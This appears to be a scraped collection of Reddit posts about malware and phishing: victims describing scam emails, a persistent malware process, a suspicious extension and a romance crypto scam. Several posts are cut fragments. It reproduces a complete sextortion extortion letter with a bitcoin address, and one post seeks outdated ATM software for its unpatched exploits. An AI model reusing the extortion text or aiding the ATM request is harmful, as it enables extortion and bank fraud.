1689671248.0,Really weird scam email,"I saw someone else posted on here with a really similar email less than a day ago, but I received this email overnight which is obviously a scam but is just so baffling that I have to share it with people. Googling the subject line without quotation marks on either side doesn't give any decent results, but adding the quotes makes it return one result, which says it's a quote from a book called Through Central Borneo. The words at the bottom of the weird number string seem to just be nonsense, though. Absolutely no search results come up for anyone named ""Jacelyn Mero"" on Google. It was sent to four email addresses including mine, and I have no clue who the other three people are. It also had a calendar file attached, which I didn't open of course, but it did have this Siri pop-up that allowed me to see its contents anyway, and it comes with even more meaningless words attached. From what I've found online, the calendar thing is basically just an easy way to get people to click on phishing links or download things and the nonsense words were just to avoid getting sent to the junk folder but like I said, I just need to share this somewhere. I'm also really intrigued by the fact that both me and the other person who posted about an email like this got ones with subject lines that, when Googled, seem to come from books from the 1910s. Why 1910s books specifically? That's what I want to know.

So I withdrew some money from Fiveer to my Paypal around the 28th that hasnt arrived on Paypal yet and now I recieved an Email with the Headline ""Reminder: FIVERR INTERNATIONAL LTD. has sent you ‚Ä™‚Ç¨16.25 EUR"" That is the exact amount of money I withdrew, and it gave me a button with ""Claim your Payment now."".

Something felt weird though, for example the Email its from is ""[service@paypal.co.il](mailto:service@paypal.co.il)"" , my full name isnt in the Email, it leads me to another Site where I have to login, and obviously, that I have to claim a payment. The latter seemed less suspcious since its the exact Amount from Fiveer, maybe an Update?

I didnt login on that weird site and it feels like a pishing attempt since that Email isnt Paypals and googling shows Israeli Sites and a an Article warning about that Email Adress, I also changed my Password on Fiveer and Paypal, but what do I do now? Something obviously is wrong if they know the exact Payment Im expecting from Fiveer.

So I contacted PayPal Support by now who told me the Email is not legitimate (and I forwarded the it to the phishing@paypal email), and Fiveer Support who told me that the Email IS legitimate and insists to get my money to click on the link and login, so what do I do now?   


The more I look on the Login Site for Paypal from the Email the more it looks suspcious, but as if effort has been put into it. (Like the Paypal logo is a png for example, not clickable).   


Since the Email is from Israel and Fiveer is from Israel, including Customer support insisting its a legit Email and telling me to get my money is to login...plus the Email knew exactly how much money and from where I was waiting for...am I too paranoid? I heard already about cases where customer support people or websites themselves stole data or tried to scam etc. people, and honestly I dont want to be crazy but the more this goes on the more red flags are showing up.

1688283723.0,google search result showing possible email phishing scam for instagram in website description?,"hi everyone, like the title says, I was searching for instagram FAQs on google when I stumbled upon a suspicious link. the link itself looked normal and even had the instagram icon, but the description of the link was interesting. the description from google basically said ""you're about to remove ""example_email@ gmail. com"" from your account. remove email."" 

when I clicked on the link (dumb of me I know) i was shown a prompt that was the same as above about removing the specific listed email from my account. I believe the instagram link is legitimate as logging out from the official site logged me out on the link as well, but I do think there is something fishy with the link. 

I looked up the email on google to little results, however on bing, I saw that some websites had the same email in the description that read, ""you are about to use example_email@ gmail. com for your recovery email for 
""second_example_email@ gmail. com."" 

I didn't click on these links as they were more cause for alarm than the instagram link but does anyone know what's going on? from what I can tell it seems that the email may be a part of something malicious but why would it appear for the top google search result for instagram? surely this is some kind of phishing scam? I assume this would be the case as my guess is as soon as one would respond with ""remove email,"" it would prompt users to log back in through the link on google. 

I didn't enter any information either besides already being logged in. I've also made sure to change my login info ASAP and so far I don't see anything suspicious on my instagram account. am I also safe or possibly screwed? thanks to anyone who can give some insight.

1693762865.0,Binary Emulation for Malware Analysis,"During my journey into reverse engineering, I stumbled upon a valuable technique: partial binary emulation while dissecting the Mirai IoT Botnet. This malicious software utilized a custom algorithm to obfuscate both its configuration and all strings within it. As the malware executed, it dynamically decrypted these strings through a specific function.  

As I delved deeper into the project, a thought crossed my mind: Could I decode all the obscured strings without having to run the malware itself? Was it possible to isolate and run only the de-obfuscation segment of the binary on all the strings it contained?  

Fortunately, I was in the process of familiarizing myself with a new reverse engineering tool, recommended by a friend, called radare2. What particularly piqued my interest was its fascinating feature known as binary emulation. I decided to put this feature to the test on the aforementioned binary.  

I meticulously documented my project and outlined the process of performing partial binary emulation with radare2, successfully decrypting all of its concealed scripting features.

1687981125.0,No judgment; just a post aimed at users seeking guidance about a potential malware infection.,"Generally - the scope of this sub isn't so much dedicated to techsupport related issues but for more meta and analytical discussion about the subject *of* malware.   
  
That being said, if you're worried about being infected or you'd like help - it's understandable to come here first because it's quite literally in the namesake. Anyway, this post is just a quick glance at your options if you have been infected or suspect you may be.  
  
First, it's important to establish whether or not you were actually infected with a malicious file. Most modern browsers and your actual Operating System (OS) make it difficult for malware to even land on your machine. That's not to say it doesn't happen - but Chrome and Edge will not let you download a malicious file if a virus is detected. If a malicious file lands on your actual OS, your system security will often identify, remove, and alert you immediately.   
  
Again - it's not to say it doesn't happen. But it's less common than just a few years ago.  
  
Second, what are you using to protect yourself? At the browser level - do you have ublock? Get it. Have you ever messed with your OS Security Settings? Don't mess with them. It's usually fine out-of-the-box. Modern OS security is built in and usually fine. But - you could always do more if you felt it was necessary. I'm not here to sell you on anything - most antivirus software has a 14 day trial and will continue to work afterward. You don't *need* it but the option is there. 
  
Third, what did you actually download? Let's say you see a program with a name like 'driver updater' appear on your Desktop one day and it wants to 'scan your computer and charge you to update your drivers' - that's not malware so much as it is scam-ware. It exists to manufacture conversions (conversions = sales) from those who are generally less knowledgeable in how computers work [elderly, etc]. Your system may or may not let it download because it's not *technically* malware. It's still annoying - but you can remove it via the 'add or remove programs' feature on Windows or drag it to the trash on Mac. Usually takes care of it.   
  
As a general practice, *if you are unsure of a file you downloaded*; go to **VirusTotal** and upload it. You just drag it to the site and it will indicate if it's something you should delete immediately or if it's fine. **This is not a catch-all solution.**
  
If you are actually, genuinely, infected, well - damn. That sucks and I'm sorry. It sucks to hear but there isn't a linear solution for you.   
  
What did you get infected with? If you get hit with ransomware and your files are encrypted - you can try to go to NoMoreRansom[.]org and see if there is a solution there for you. But - the best thing you can do is just reinstall your OS. Seldom will a malware be so sophisticated that it hangs around after that.    
  
Not to say it doesn't happen - but it's not an incredibly common occurrence. Your machine and OS are kind of separate. You can remove the OS from device and it's still a laptop - just with incredibly limited function. You can even install MacOS on a Windows-based laptop - don't actually do that but it emphasizes the idea of separation between the *machine* and the *OS*. Your OS is typically what gets infected, not your machine. 
  
As a backup plan - please, and I am begging you, take half an hour out of the day and dive into how to create a system recovery USB and keep it in a desk drawer. It will delete everything from your old system. It's your prerogative how you want to handle potential data loss. Put some things you want to save before it's wiped out on a USB or something. No linear answer on whether those files are 'dangerous' anymore.   
  
Do *future you* a favor and start developing a habit of creating backups. We all have things that are important to us and we can ensure continuity of those things by *putting them somewhere else* and even *multiple places*. You like downloading funny videos? Upload them to Youtube and set visibility to private. Important photos? Please put them somewhere like Google Photos. School work? Put it on Google Drive. I use a personal, private, FB group to upload hundreds of photos from concerts, life, personal videos, etc. It's private and stored *off my machine* - so there is continuity. It's your prerogative for what you upload and where. If you hate FB, don't use it. Free storage is free storage and I don't care about the quality loss.    
  
Just being conscious about what you are doing online makes it more difficult to even get infected in the first place. If you do get infected - do not panic. Your computer isn't going to catch on fire(x). Take the time to find out what is going on, what it is that you are seeing, and how to tackle it. Approaching things haphazardly is not the best way to protect yourself. 


(x) If your computer *does catch on fire*, please send us a sample of what you were infected with because that would be incredibly cool. Not for you. But...for us. Sorry.",Malware,5027,901,139,0

Not this one. It was a nightmare. I'm not very tech savvy so I don't know what info to prompt about the virus but, basically:
-The virus appeared as a parent process in task manager called ""Tiny Subaru"". Under it, PinkwoodNegoga was being executed. 
-Trying to stop the process didn't do anything because it automatically started again 
-The executable file was on my Program Files x86 folder. It was impossible to delete because it was always in execution. 
-Using Msconfig and trying to uncheck the box next to ""PinkwoodNegoga.exe"" in the Startup tab was no use because when I clicked ""apply"" it automatically checked again (?????? Like how?) 
-I told chatgpt to write a command to stop the program and delete in one go. Here it is:
$processName = ""PinkwoodNegoga.exe""

# Check if the process is running
if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
    # Terminate the process
    Stop-Process -Name $processName -Force

    # Delete the executable
    Remove-Item -Path $processName -Force
}
else {
    Write-Host ""The process '$processName' is not currently running.""
}
 
It didn't work because it said I didn't have permit (yes, I started cmd as administrator) 
-Then, my friends came out with the idea of telling chatgpt to write a script that would close the program in loop. Here it is:
$exePath = ""C:\path\to\executable.exe""
$intervalInSeconds = 5

while ($true) {
    $process = Get-Process | Where-Object { $_.Path -eq $exePath }

    if ($process) {
        Write-Host ""Closing the executable...""
        Stop-Process -Id $process.Id -Force
        Start-Sleep -Seconds $intervalInSeconds
    }
    else {
        Write-Host ""Executable not found. Exiting the loop.""
        break
    }
}

I made it run in powershell, then tried to delete the .exe, and, unsurprisingly, the ""this thing cannot be deleted because it is executing"" window came up. I spammed the ""Try again"" button until it randomly timed itself right and it finally deleted. 
We stopped the services and everything and we'll, I'll format my computer anyway but at least I don't feel too scared now.

The software that I need is ProBase\\C 12.xx or older or old versions of Diebold Agilis 91x. I prefer older versions of these ATM programs since I don't really want to use new versions of the software since exploits and such are patched and I would like to use something that is not being used by banks.

I know that I should probably just buy a literal ATM but I can't really do that for obvious reasons.

I'll start by briefly explaining my situation. The other day, I got a popup on an adult website on my phone I can get really paranoid about potentiel malwares. Though my phone hasn't shown any strange behavior, and even after a VT scan of the popup website that showed only clean results, Kaspersky and Malwarebytes analysis showing my phone is safe, I'm still a bit paranoid that something might be lurking.

Which leads us to my question. I'm certain this paranoia is due to my lack of knowledge about malwares, and it's time I learn more about all of this to better protect myself.

So, what are good ressources I could start with?

**So some questions for professionals already in the field:**

* How much of the Malware you analyze is actually challenging / fun to reverse? Or will it be mostly the same script kiddy stuff with slight variations?
* Additionally, how big a part is reverse engineering and in-depth analysis of your day-to-day job? Or is more time spent aggregating reports from VirusTotal / automated sandboxes / scanners, documentation, meetings?
* How future-proof is the role? Could it be in danger of being replaced by AI? Or could it actually become more valuable due to AI-driven malware?
* Are you satisfied with your current position? Or would you rather have gotten into security engineering, incident response, pentesting, etc. ?
* Any tips for getting into the field? Currently looking to start & finish the Practical Malware Analysis course by TCM to hopefully acquire a foundation, and then start building up a repertoire of analyzed malware.
* Anyone care to comment on the job market for malware analysts in Europe? Is it over-saturated or under-saturated? Any requirements to be on-site or is it usually remote work?

Howdy beautiful people,

I had a powershell window pop up briefly that tabbed me out of a full screen application, otherwise I may not have noticed it. Never had that happen to me before. Nothing unfamiliar installed recently.

I understand posh enough to see whatever it is, it was trying to download something through a series of TXT DNS record lookups to a list of shady looking domains.

I caught the script running somewhat early and killed it (powershell.exe process using up 1 GB+ memory). I'm not sure that it succeeded in whatever it was trying to do, but the path to the script was nested in a randomly named temp folder under Windows\\system32.

1667303137.0,Cracking group Razor1911 custom installer likely contains malware,"Before reading, please bear in mind that I don't have much knowledge about malware in general.

I believe the custom installer from Return\_to\_Monkey\_Island-Razor1911 contains malware, as well as in other games such as Stray, Metal Hellsinger and probably several others. It seems that they sometimes use the game's original (clean) installer in many releases though. I've compared the installer file content from public and private trackers just to be sure that it's not been altered, and the files also match on [virustotal](https://www.virustotal.com/gui/file/10fadef6b93740e8444a8d90110ee72a1e336519cae2272088a58f829e94be3f/detection).

Like others, I was a bit surprised when Windows real-time protection flagged this installer as malware. Usually it's cracked exe and dll files that get flagged (mostly false positive). All game files in Setup.bin as well as the crack steam\_api64.dll are not flagged as malware on virustotal. So if all theses files are clean, then why is the installer flagged as malware if the installer's only job is to extract some game files? The analysis on [hybrid-analysis](https://www.hybrid-analysis.com/sample/10fadef6b93740e8444a8d90110ee72a1e336519cae2272088a58f829e94be3f) is much more thorough though and [here](https://www.hybrid-analysis.com/sample/10fadef6b93740e8444a8d90110ee72a1e336519cae2272088a58f829e94be3f/635fed6c37f6632ac8713a5b) you can see that it even uses techniques to avoid malware analysis in VM!

What's your take on this? How confident are you that this actually is malware?

1663694913.0,"[Advice Needed] Malicious Browser Extension (Proxy/Botnet) - How can I be sure, and is there any way to get it taken down?","I previously had an extension installed in my browser (Vivaldi, which is Chromium-based) that I only used a few times but left enabled for a while. I have a strong suspicion that this extension is using their end-users' browsers to route/proxy traffic from an external service.

The extension in question is called ModHeader, and is available in the [Chrome Web Store](https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj), [Firefox add-ons site](https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/), and the [Edge add-ons site](https://microsoftedge.microsoft.com/addons/detail/modheader/opgbiafapkbbnbnjcdomjaghbckfkglc). On [their own website](https://modheader.com), they claim to have 600k+ users.

At the very least, I can prove that this extension was once malicious. (If I had known this, I never would have installed it.) [Krebs posted on it](https://krebsonsecurity.com/2021/03/is-your-browser-extension-a-botnet-backdoor/), and shared this information, with quotes from the developer!  
 

>Then came Infatica, whose code was fairly straightforward by comparison, he said. It restricted the company to routing web requests through his users‚Äô browsers, and did not try to access more sensitive components of the user‚Äôs browser experience, such as stored passwords and cookies, or viewing the user‚Äôs screen.  
>  
>More importantly, the deal would net him at least $1,500 a month, and possibly quite a bit more.  
>  
>‚ÄúI gave Infatica a try but within a few days I got [a lot of negative user reviews](https://github.com/bewisse/modheader/issues/64),‚Äù he said. ‚ÄúThey didn‚Äôt like that the extension might be using their browser as a proxy for going to not so good places like porn sites.‚Äù  
>  
> Again he relented, and removed the Infatica code. 

Unfortunately, I believe this extension is once again doing something similar. I received a notification from my ISP that I was approaching my monthly data cap (something I could rant about, but I'll hold back on that for now). The usage report from my ISP showed a period of 6 days where my usage hovered around 120GB per day (low of 81GB, high of 174GB). This is far outside of the norm for me (didn't download any large games, etc. during this time).

I was able to trace this back to my desktop, which was surprising, since I assumed something was going on with one of the apps on my home server. I didn't have any detailed logging running at the time, but I pulled up the data usage details built into Windows, and saw over 500GB of data recently used by Vivaldi. I probably haven't downloaded more than 1GB of files through Vivaldi during this time period, and haven't even been watching many videos/streams, etc.

So I suspected it was a browser extension. I disabled a handful I thought could potentially be the culprit and went to bed. In the morning, I saw my data usage was already over 25GB, which was very strange, considering I hadn't even touched my computer that day.

Of the few that were still enabled, ModHeader was one of them. I disabled it and installed an application to keep track of data usage of each Windows application. Between then (9/17) and now (9/19), Vivaldi has used less than 1GB of data (combining both send and receive).

I attempted to investigate a bit by re-enabling the extension, but it seems like the behavior wasn't happening again. I'm curious if it somehow waits until X hours/days to start this behavior, maybe to determine if the browser is open for long enough periods of time, and the connection is fairly stable.

That brings me to my questions - can anyone help me determine if this extension is indeed behaving this way again? The source is on GitHub, and an issue was previously raised (see the link in the Krebs quote), but I'm questioning if that source is truly what is uploaded to the extension/add-on sites. I admittedly don't have the knowledge to analyze the code, though I know downloading the extension and unpacking it would be the best way to start.

If it is confirmed that this extension is indeed performing this malicious activity, what can even be done about it? I saw the sites for the developer are hosted on AWS, could I report it there? (I don't know if the traffic for the proxy is routed through AWS, though.)

**TL;DR - ModHeader browser extension was previously confirmed to be malicious, and I believe it implemented this behavior again. Can we determine if this truly is the case, and if it is, what actions can be taken to try to keep others from being taken advantage of?**",Malware,4559,730,111,0

1654040606.0,Preventing malware with a security analyst approving all new code execution?,"Do you think approving all new code on a computer/network is a good way at preventing malware?

Description:
A security analyst is notified that a user wants to run a new program and approves it (and its libraries) after a quick investigation; such verifying the digital signature (Authenticode) and VirusTotal check.  It's an improvement on application whitelisting used by AppLocker because it's better implemented and has less bypasses.  Instead of AV signatures, everyone (corporate and even home users) would have execution signatures that get updated and pushed out network wide in near real time.

We have full time IDS/EDR analysts, why not an execution analyst (or MSSP) who investigates new programs introduced on the network?  You start by approving your gold image that gets rolled out.  You would have a short list of *new* software that is approved to run on your network or computer; especially if an entire software company gets approved by the execution analyst based on their digital signature.  If code is unsigned, it could be signed by the execution analyst and that signature stored securely.

The General Process:
1. Hook Windows Loader/LoadLibrary
2. End user launches a *new* program on the network and chooses its priority for getting approved. e.g. needs to be approved in 1 minute, 10 minutes, 30 minutes, tomorrow.
3. The program and its details are sent to the software execution analyst.
4. Analyst investigates (Digital Signature, VirusTotal, etc.) the software and allows it to run in some way. e.g. approves the entire publisher to run on your network, or approves it to run on just that computer/OU at a low integrity.
5. The analyst's decision is immediately pushed out to all other computers on the network.

The result of this methodology is that all of the decryption keys released in relation to the ransomware are publicly available.

1642245129.0,Collection of tools for executable packing detection,"For what it's worth... I rewrote a few tools coming from old papers for studying **executable packing** as I couldn't find descent versions for testing and automating them.

- [Bintropy](https://github.com/dhondta/bintropy): Entropy-based packing detection featuring multiple modes (whole binary, per section or segment). Based on the awesome [LIEF](https://github.com/lief-project/LIEF) library, therefore supports ELF, PE, Mach-O.
- [PEiD](https://github.com/dhondta/peid) (Python version): Yet another version of it (I found a few others, but always with an outdated `userdb.txt`), but with a `userdb.txt` merged from various repositories and an additional tool for making new signatures.
- [PyPackerDetect](https://github.com/dhondta/PyPackerDetect) (upgraded fork): Refactored version of the [original](https://github.com/cylance/PyPackerDetect) that seems to be discontinued.

All these are automated/mechanized in a [Docker image](https://github.com/dhondta/docker-packing-box) that allows to do far more than just playing with some packing detectors.

I am not a professional malware analyst. More of a hobbyist who is considering seriously upping his training for a possible career change. Or just to add to my skills.

I have so far been running my malware and other dev/training labs on my 2015 Intel Macbook Pro using VMWare Fusion. I had been eagerly anticipating the release of the new MBP since at 6+ years old my laptop is now showing its age.

However, the new Apple silicon being ARM-based, x86 emulation is a problem. VMWare has said it will not support x86 emulation on its software going forward, so no more old 32-bit OSes on the Mac as far as I know. For various reasons, the ability to spin up those old 32-bit Windows OS VMs is important to me. Analyzing malware on a 32-bit Windows OS would be one of those reasons.

Are there any other Redditors out there who have now run into this problem? If so, what future options are you considering? I'm not an Apple ""fanboy"" by any means, but I do prefer Apple hardware and MacOS. Is anyone aware of any options on how I could continue to run old 32-bit Windows OSes on the Apple silicon going forward? Any ideas are appreciated.",Malware,1229,227,28,0

Hello. The information below is crucial and is being shared for your awareness.
The date 6/6/2023 11:14:23 PM
 marks when I successfully hacked into your device's operating system and secured full control over your account ""ops name
"". My surveillance of you has been ongoing for a considerable period.

I've integrated a software within your system, giving me the ability to control all your devices.
The malware I've positioned gives me complete command over your device's essential tools ‚Äì your microphone, video camera, keyboard, and display. Your data, photos, and browsing history now reside on my servers, along with access to all your communication platforms ‚Äì messengers, social networks, emails, synced data, chat histories, and contact lists.
I learned a lot about you!

I pondered on the possibilities that this data presented...
Recently, I've conceptualized an intriguing idea: using AI to develop a split-screen video. One side displays you involved in masturbate  , while the other casts your internet navigations. Videos like this are currently trending!

Boy, I was really taken aback by what came up.

With a single click, I can distribute this video to all your contacts through email, social networks, and instant messengers. Furthermore, I could expose access to all the emails and messaging apps you use.
Additionally, I found a plethora of intriguing materials that I could disseminate online and share with friends.

If you'd rather I didn't carry this out, send 800 $ (US dollar) in my bitcoin wallet.
BTC wallet address:
bc1qa7s0gqxyn3922tr4fxcpv7s0n6q7muy29tvc8f

If you're unfamiliar with how to fund a Bitcoin wallet, you can always use Google for help. It's quite straightforward.
Once the funds have been received, I will immediately remove all unwanted material. Afterward, we can part ways. I assure you that I am committed to deactivating and removing all malware from your devices. You can trust me; I always honor my commitments. This is a fair deal, especially considering the time and effort I've invested in tracking your profile and traffic.

I give exactly two days (48 hours) from the moment of opening this letter for payment.

After this period, if I don't receive the specified amount from you, I'll distribute access to your accounts, visited sites, personal data, and edited videos to everyone, without any warning.

You see, I don't mess up. It's not a good idea to try and pull pranks on me because I have plenty of tricks up my sleeve.

There's no use reporting me because they won't be able to locate me. Formatting the drive or destroying your device won't help because I already possess your data.

It makes no sense to write back to me - I do not write from personal mail and do not look at the answers.




Wishing you luck, and don't let this raise your hackles!

We all have our roles, and it seems you drew the short straw today.




P.S. In the future, I recommend that you follow the safety rules on the Internet and do not visit dubious sites.

However, I want to be thorough and ensure that no malicious processes were initiated if an end-user clicked on the link.  

 Here are the details of the situation:

* The sender's email address appears to be from a well-known organization.
* The email contains a link to a website that, at first glance, seems legitimate.
* I couldn't find any reports or indicators of compromise related to this domain or email in my initial research.

My main concern is determining whether clicking on the link could have led to any malicious processes or potential data breaches. I'd appreciate any guidance on how to perform a more in-depth investigation or any tools and techniques that can help me with this specific scenario.

Here are some questions I have:

1. What steps can I take to analyze the link further, even if it appears clean on VirusTotal?
2. Are there any tools or services that specialize in detecting more advanced or zero-day threats?
3. How can I check if any malicious processes were initiated on a user's device after clicking the link?
4. Are there any specific logs or indicators I should be looking for on my network or endpoint devices?

Someone has actually tried to open a credit card in my name before so I wasn‚Äôt surprised it was happening again. I said no and please close the account. They told me they were canceling the account but two transactions were pending from Zelle and I needed to call Zelle and cancel the charges. They gave me a second number to call. I was panicked at this point and called it. But once I was on the phone again I realized it was a scam when they asked me to add a contact to my Zelle account and add a routing number (presumably to ask me to send money to it to ‚Äúcancel‚Äù the charges). I started to push them a little bit and it became more clear this was a scam operation when I got them off script.

This person said his name is Davis ( Jiawei Zhuang), mentioned he is in London and originally from China. He firstly chatted with me for 2 weeks and created a good relationship. Then he mentioned he would like to help me to get more incomes by teaching me crypto through a platform called Fex Global. Which later I figured out, all the money go into this platform will go straight into his pocket. 

I trusted him so much because of his nice words to me and the intentions to help others. He said he has more than 10 years experiences in crypto and has business in London as he is an entrepreneur. 

I was so stupid to trust in him and put my money in there. He offered to send through $26,000 coins to help me trading. When I started to suspicious, I tried to withdraw my money but the platform asked me to pay the fee of more than $2,300 USDT to be able to withdraw funds. And have to pay upfront. 

I asked them why they do not deducted from the balance of my account and they denied to do so. My money locked up there. He pretended to be a victim. When I asked him to pay the fee as he introduced me to this platform and did not tell me anything about this fees. He denied and said that I pay for them and then I can get money back. 

I reported to our cybersecurity in my country in Australia. Obviously, I never get my money back. They all locked up there on Fed Global and the consultant from cybersecurity advised me do not pay any more as they are scammers. 

I know I am so stupid to trust this person. And now I just try to share and warn everyone out there.

Hope no one will fall in him again. He has multiple accounts with different name.

Even the face on Facebook, he get the pictures from a tiktoker Instagram China. I guess the person in the pictures, not even him.",phishing,1911,365,33,1

Without getting into too many details, I own chemical distribution company. A few days ago we received this email (see screenshot.)

There's was no body, just the intended recipient disclosure and some other boilerplate along w/ a single attachment of what appears to be some sort of receipt for a purchase order, it's not exactly descriptive. 

The aforementioned attachment *appears* to be a receipt or invoice of some sort relating to a purchase order and also I believe the file is being hosted by Google Drive? I could be wrong on that last part. 

The file claims to have an "".html"" extension. 

I was hoping someone could examine this file in a sandboxed environment or whatever you deem appropriate? It goes without saying I have not done anything with the attachment except forward to email to compartmentalize machine at which point I plan to share the original with whoever's willing to take a look and I will be applying my limited experience as well.

It's clearly targeted at my business, and I would be very generous to anyone able to help us to understand what they're objective was. and any idea who or what they may be.

No rushing, just consistent innovation.

Blockchain for me has been an interesting journey. Bought some eth on coinbase in 2017 but didn't really dive in til 2020 then deeper in 2021 & beyond while part time caretaking for my mom and pops who had breast cancer & dementia. After my pops passed I started co-producing blockchain events to cope. During that time I got hacked out of $7,500 since I went to uniswap.com the day they upgraded to Uniswap V3 thinking they also upgraded their sub domains to accommodate more urls. My tokens that got hacked would've doubled in value within a week from that time. Posted it on reedit immediately to warn everybody. It was a hard pill to swallow but a good learning lesson and have been avoided all phishing links for the last two years.

Unfortunately when I signed onto opensea tonight I saw that my NT Citizen #3931 had been purchased for O ETH 3 days ago. I've posted the transaction below. They did this to another neotokyo member shortly after and resold at discount deliberately lowering the floor. They have scammed over 100,000 people across some of the biggest nft communities (otherdeeds, byopills, azuki etc).

Should I be concerned that something malicious happened and that the email deleted itself to avoid detection? Or did my email/school security/ antivirus software step in and deleted the email on purpose? 

&#x200B;

Any suggestion on what I should do next for protection and precaution? Currently, performing a deep scan on my PC.

1683739609.0,What happened here?,"I‚Äôm trying to figure out what exactly happened with a situation. 

Part of my job is processing requisitions and ordering items for end users. Yesterday I received a requisition for a piece of sports equipment and the end user attached screenshots of a few websites with this item. I googled the item number and the lowest price website came right up same as their screenshot. It was a low dollar amount so I went to purchase it on my company card. At the end of checkout after clicking submit there was a popup asking me to verify the transaction but the dollar amount and website named were different. There were two options for verification: a text to my personal cell number which was indicated by the phone number with all but the last four numbers redacted or an email to my personal email address also with only part of the email visible. Neither my personal cell or personal email were provided to this website during the checkout process. I knew something was wrong so I did not select a verification option and closed out of the browser. I went to my emails both work and personal but had no email. It was late in the day and the card administrator was gone for the day so I decided to have him check the card website in the morning to see if the transaction went through. 

This morning I went back to the website to see if the item was still in the cart and realized the website might be fake. The logo used was for the brand Wilson but this was not the Wilson website. I googled the website and found it might be fake. I had the card admin look and there were no charges on the card. He had me call the card‚Äôs fraud line and tell them what happened and they cancelled the card to be safe. 

I guess my question is: how did the website link my company card to my personal email and cell? The only info that was not work related was my name and it‚Äôs not that uncommon of a name. The computer used was my work computer that I‚Äôve never used to access my personal email.",phishing,1978,374,21,1

I got curious and they told me to go on Snapchat to discuss it as they didn't want me to screenshot the convo and I obliged. They told me they were a close friend of my ""ex"" and that my ""ex"" used to send them my private pictures and videos back in December. I didn't even believe it yet as my ""ex"" never mentioned someone with his (dummy) name but he told me he kept 2 of the pictures that my ex apparently sent him and sent me one of them. It had my face clearly. I was so sure it wasn't my ex who sent him that and he even confirmed it and now the anonymous guy keeps begging me to send him our ""sex tape"" and even going as far as to ask me to let him open my Snapchat account and he'll watch from there.

There are no attachments or links, and it just seems to be a plain text email. I checked my mail (including spam, promotions etc.) and it's all just your average automated emails from stuff like Google and Tumblr. Definitely nothing hand-written.

I woke up this morning to another email, exact same title and body from the same address (first letter of the title uncapitalized), sent at 4:17am.

So... this doesn't seem *obviously* dangerous, it's just text, but the circumstances around it seem extremely suspicious. I might have replied to it if it was my main email, but I literally never use this one, and I figured if it was an actual human being they would at least mention what they're contacting for?

My best guess is that this is an automated thing sent to hundreds or thousands of random email addresses, and then once you reply they try to rope you into giving details or clicking things. But any second opinions before I report it would be appreciated :)",phishing,1514,275,39,1

1680981651.0,Spam report to ISP's abuse address bounces because spam is detected,"I was getting easily 100 phishing emails a day.

* This is an old Hotmail account.
* It appears in at least two lists of accounts from system compromises, posted on the dark web.
* Now it acts as if it were a honeypot for phishing campaigns.

At the start of February, I decided to send emails to ISPs notifying them that they have a customer violating their Terms of Service.

* Save the email as text, retaining its original headers.
* Redact the email, removing personally identifiable information.
* Find the originating IP address and the time it was sent (including time zone).
* Find the ISP for that IP address.
* Find the abuse email address for that ISP.
* Send the ISP the text of the email, the originating IP address and date and time, as well as an explanation of why you claim it is fraudulent (e.g., there's no Coinbase account associated with this email address) and your contact name and phone number.

With the originating IP address, and date and time, the ISP can figure out who the customer is and at least warn them. Three strikes and terminate their account. It is in the ISP's best interests to get spammers and phishers off their network before the IP appears on a blacklist. Getting on a blacklist means other customers won't be able to use their service. Getting off a blacklist is a pain.

This doesn't stop the spammers, who easily find another ISP who will sell them service. It's a shame that there's no coordinated repository of repeat offenders, so that they can be blacklisted. (I remember that someone asked how they get away with this; the absence of coordination explains a lot.)

But first the spam has to be brought to the attention of the ISP.

No, I don't do over 100 reports a day. Maybe 10. Still, I make some effort.

Today I saw over 60 emails in my Hotmail account's ""Junk Email"" folder, before 8:00 AM. 57 of them were bounced emails. Bounced with the explanation:

>Remote server returned '550 5.7.520 Message blocked because it contains content identified as spam. AS(4810)'

Well that's ... what? Of course content would be identified as spam; it is supposed to be spam. That's why I am reporting it. That's why there's an abuse contact mailbox. And the evidence of spam is in the attachment, not the email itself.

I also report all phishing to Microsoft. This doesn't do anything to stop phishing, it only helps them modify their filters. This has the unfortunate side effect of burying the good emails that get sent erroneously to Junk Email under a pile of phishing messages.

The majority of the messages came from [phish@outlooksen.onmicrosoft.com](mailto:phish@outlooksen.onmicrosoft.com). That's not the address I sent them to; I suspect that their abuse contact system filters messages and forwards them to the appropriate team. I know I haven't sent that many to Microsoft in their role as an ISP in the last two months. I'm still trying to figure out what these messages are in relation to. My guess is that a message bounced around so much that it looked like multiple messages, the queue backed up, and this was their way of clearing the queue.

Three messages, though, came from three other ISPs. Abuse contacts bouncing messages because they detect spam. That sounds like a configuration error to me; the abuse mailbox is where you want the examples of spam sent. Someone must have been overzealous with their spam filter configuration.

But three (or, if you include Microsoft, four) ISPs making the same configuration error at the same time? That's not very plausible.

* New security breaches due to rise of work from anywhere / remote work  
* Employees are being trained but not concerned about potential security breaches 
* Employees are aware of cybersecurity but optimistic bias makes them continue with bad practices (i.e. share a password through internal comms channels, download documents, connect to public wifi networks, using personal laptop,...)  

Existing trainings around cybersecurity aren‚Äôt working. Moreover, they are not updated to new employees' potential bad habits (i.e. when traveling, when working remotely,...)

***The solution:***

**A behavioral security trainings catalogue to change employees‚Äô habits and catch the hack before it‚Äôs too late**

* **Effective training** on cybersecurity based on a catalogue of pre-defined templates to simulate employee hacks
* **Incentives for employees** to adopt secured practices (rankings and rewards)
* Real-time data for CTOs to track the **company‚Äôs real security level** and anticipate threats

**How it would work:**

* **Step 1. Choose and customise pre-defined hacks:** Phishing, CFO fake fraud, simulation of a home wifi hack,... and new hacks related to work from anywhere
* **Step 2. Update employee and providers list and start train-hacking them**If they click on the bait, they‚Äôre shown how to prevent it on the future through microlearning pills, ; if they don‚Äôt, they are rewarded

Last night I was visiting an adult website, and I ended up clicking a link in the comments. It was to a website called beacons. ai (space added just in case) with a specific subdirectory after the slash. I did a quick Google search and it seemed like the site was safe.

However, when I followed through to the link it did not appear to be what I thought it was (sort of a social media platform like onlyfans). It looked like one of those ads you see for local singles in your area. I exed out after a few seconds and did not enter any information.

I was high and paranoid, so I plugged the address into [Virustotal.com](https://Virustotal.com). It said 1/90 security vendors flagged the URL as malicious for phishing. The rest came back clean. Is this a false positive? The service that flagged it was Xcitium Verdict Cloud.

I also ran it through [urlvoid.com](https://urlvoid.com) which had 1/40 security venders flag it. This time it was SCUMWARE. Lastly, I ran it through [https://safeweb.norton.com/](https://safeweb.norton.com/) which said the link was OK.

I suspect it's fine, but I'm generally pretty cautious about clicking unknown links so this type of situation doesn't come up often. Do you think these flags were false positives or should I be worried? Some additional information that might help you assess my security.

